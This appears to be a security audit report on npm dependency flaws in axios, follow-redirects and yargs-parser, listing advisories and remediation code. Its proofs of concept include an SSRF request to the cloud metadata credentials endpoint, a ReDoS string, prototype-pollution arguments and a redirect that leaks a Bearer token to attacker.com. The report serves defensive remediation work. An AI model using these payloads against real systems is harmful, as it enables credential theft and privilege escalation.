## 🎯 VULNERABILITY #1: Axios SSRF & Credential Leakage

### 📋 Basic Information

| Field | Value |
|-------|-------|
| **Package** | axios |
| **Vulnerable Versions** | ≤ 0.30.1 |
| **Severity** | 🔴 HIGH |
| **CVEs** | Multiple (5 advisories) |
| **CVSS Score** | 7.5 - 9.1 |

### 🔍 Detailed Advisories

#### 1️⃣ Server-Side Request Forgery (SSRF)
```yaml
Advisory: GHSA-4w2v-q235-vp99
Type: Server-Side Request Forgery
Impact: Unauthorized access to internal resources
Attack Vector: Network
Complexity: LOW
```

**Description:**  
Axios allows attackers to perform SSRF attacks by manipulating URLs in HTTP requests, potentially accessing internal services and cloud metadata.

**Proof of Concept:**
```javascript
// ❌ VULNERABLE
const axios = require('axios');

// Attacker can force requests to internal services
await axios.get(userInput); // userInput = "http://169.254.169.254/latest/meta-data/"
```

---

#### 2️⃣ Cross-Site Request Forgery (CSRF)
```yaml
Advisory: GHSA-wf5p-g6vw-rhxx
Type: Cross-Site Request Forgery
Impact: Unauthorized actions on behalf of authenticated users
Attack Vector: Network
Complexity: LOW
```

**Description:**  
Missing CSRF token validation allows attackers to perform unauthorized actions.

---

#### 3️⃣ Inefficient Regular Expression (ReDoS)
```yaml
Advisory: GHSA-cph5-m8f7-6c5x
Type: Regular Expression Denial of Service
Impact: Application freeze/crash
Attack Vector: Network
Complexity: LOW
```

**Description:**  
Crafted input can cause exponential regex evaluation, leading to DoS.

**Proof of Concept:**
```javascript
// ❌ VULNERABLE - causes infinite loop
const maliciousUrl = 'http://example.com/' + 'a'.repeat(10000) + '!';
await axios.get(maliciousUrl);
```

---

#### 4️⃣ Lack of Data Size Check (DoS)
```yaml
Advisory: GHSA-4hjh-wcwx-xvwj
Type: Denial of Service
Impact: Memory exhaustion
Attack Vector: Network
Complexity: LOW
```

**Description:**  
No size limit on response data allows attackers to exhaust server memory.

---

#### 5️⃣ Credential Leakage via Absolute URL
```yaml
Advisory: GHSA-jr5f-v2jv-69x6
Type: Information Disclosure + SSRF
Impact: Credential theft + Internal access
Attack Vector: Network
Complexity: LOW
CVSS: 9.1 CRITICAL
```

**Description:**  
Credentials embedded in URLs can be leaked through logs and error messages.

**Vulnerable Code Pattern:**
```javascript
// ❌ DANGEROUS - credentials in URL
const response = await axios.get(
  `https://${username}:${password}@api.example.com/data`
);
// Credentials logged in browser history, server logs, proxies
```

---

### 🛡️ Solution for Axios

```bash
# Update to latest safe version
npm install axios@latest

# Verify version
npm list axios
# Expected: axios@1.7.9 or higher
```

```javascript
// ✅ SECURE IMPLEMENTATION
const axios = require('axios');

// Use headers for credentials
const secureAxios = axios.create({
  baseURL: 'https://api.example.com',
  timeout: 5000,
  maxContentLength: 10 * 1024 * 1024, // 10MB limit
  maxBodyLength: 10 * 1024 * 1024,
  headers: {
    'Authorization': `Bearer ${token}` // NOT in URL
  }
});

// Whitelist allowed domains
const ALLOWED_DOMAINS = ['api.example.com', 'trusted.com'];

function validateUrl(url) {
  const parsed = new URL(url);
  if (!ALLOWED_DOMAINS.includes(parsed.hostname)) {
    throw new Error('Domain not whitelisted');
  }
  return true;
}

// Use validation before requests
const url = userInput;
validateUrl(url);
const response = await secureAxios.get(url);
```

### 🔍 Detailed Advisories

#### 1️⃣ Proxy-Authorization Header Leak
```yaml
Advisory: GHSA-cxjh-pqwp-8mfp
Type: Information Disclosure
Impact: Credential theft across redirects
Attack Vector: Network
```

**Description:**  
Proxy-Authorization header is kept across different hosts during redirects, exposing credentials.

**Attack Scenario:**
```javascript
// User requests: https://trusted.com → redirects to https://attacker.com
// Proxy-Authorization header is sent to attacker.com!
```

---

#### 2️⃣ Sensitive Information Exposure
```yaml
Advisory: GHSA-74fj-2j2h-c42q
Advisory: GHSA-pw2r-vq6v-hr8c
Type: Information Disclosure
Impact: Header leakage
```

**Description:**  
Sensitive headers (Authorization, Cookie) leaked during cross-origin redirects.

---

#### 3️⃣ URL Parsing Vulnerability
```yaml
Advisory: GHSA-jchw-25xp-jwwc
Type: URL Manipulation
Impact: SSRF potential
```

**Description:**  
Improper URL parsing in `url.parse()` allows bypass of security checks.

---

### 🛡️ Solution for follow-redirects

```bash
# Update to safe version
npm install follow-redirects@latest

# Verify
npm list follow-redirects
# Expected: follow-redirects@1.15.6 or higher
```

```javascript
// ✅ SECURE CONFIGURATION
const followRedirects = require('follow-redirects');

const options = {
  maxRedirects: 3, // Limit redirects
  maxBodyLength: 10 * 1024 * 1024,
  
  // Remove sensitive headers on redirect
  beforeRedirect: (options, responseDetails) => {
    if (options.hostname !== responseDetails.redirectUrl.hostname) {
      delete options.headers.authorization;
      delete options.headers.cookie;
      delete options.headers['proxy-authorization'];
    }
  }
};
```

## 🎯 VULNERABILITY #4: yargs-parser Prototype Pollution

### 📋 Basic Information

| Field | Value |
|-------|-------|
| **Package** | yargs-parser |
| **Vulnerable Versions** | ≤ 5.0.0 |
| **Severity** | 🟠 MODERATE |
| **Advisory** | GHSA-p9pc-299p-vxgp |
| **CVSS Score** | 5.3 - 7.5 |

### 🔍 Details

```yaml
Type: Prototype Pollution
Impact: Object property injection
Attack Vector: Local
Complexity: LOW
```

**Description:**  
Allows attackers to inject properties into Object.prototype, potentially leading to security bypasses or DoS.

**Proof of Concept:**
```javascript
// ❌ VULNERABLE
const parser = require('yargs-parser');

// Attacker input
const malicious = parser('--__proto__.polluted=true');

// Now all objects are polluted!
console.log({}.polluted); // 'true'
```

**Impact:**
```javascript
// Security bypass example
if (user.isAdmin) { // Can be polluted to true
  grantAdminAccess();
}
```

---

### 🛡️ Solution for yargs-parser

```bash
# Update to safe version
npm install yargs-parser@latest

# Verify
npm list yargs-parser
# Expected: yargs-parser@21.1.1 or higher
```

```javascript
// ✅ SECURE: Use Object.create(null)
const safeObj = Object.create(null);
safeObj.isAdmin = false; // No prototype pollution possible
```

## 🎯 Exploitation Scenarios

### Scenario 1: SSRF Attack via axios

```javascript
// Attacker sends malicious link
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

// Server uses vulnerable axios
const response = await axios.get(req.query.url);

// Result: AWS credentials leaked!
```

### Scenario 2: Credential Theft via follow-redirects

```javascript
// User authenticates to trusted.com
Authorization: Bearer secret_token

// Server redirects to attacker.com
302 → https://attacker.com

// follow-redirects sends the token to attacker!
GET https://attacker.com
Authorization: Bearer secret_token
```

### Scenario 3: Prototype Pollution Chain

```javascript
// Attacker pollutes Object.prototype
yargs.parse('--__proto__.isAdmin=true');

// Later in code
if (user.isAdmin) {  // Always true now!
  deleteAllData();
}
```
